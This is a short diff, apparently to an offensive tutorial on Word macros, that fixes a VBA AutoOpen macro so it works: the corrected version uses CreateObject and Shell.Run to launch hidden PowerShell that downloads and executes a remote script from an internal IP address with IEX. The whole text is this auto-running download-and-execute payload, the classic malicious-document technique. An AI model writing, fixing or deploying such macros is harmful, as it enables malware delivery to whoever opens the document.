@@ -23,9 +23,9 @@ You can create a macro in a Word document by going to **View > Macros > Create*
 
 Sub AutoOpen()
 
-  Dim proc As Object
-  Set proc = GetObject("wscript.shell")
-  proc.Create "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/a'))"
+  Dim Shell As Object
+  Set Shell = CreateObject("wscript.shell")
+  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/a'))"
 
 End Sub
 
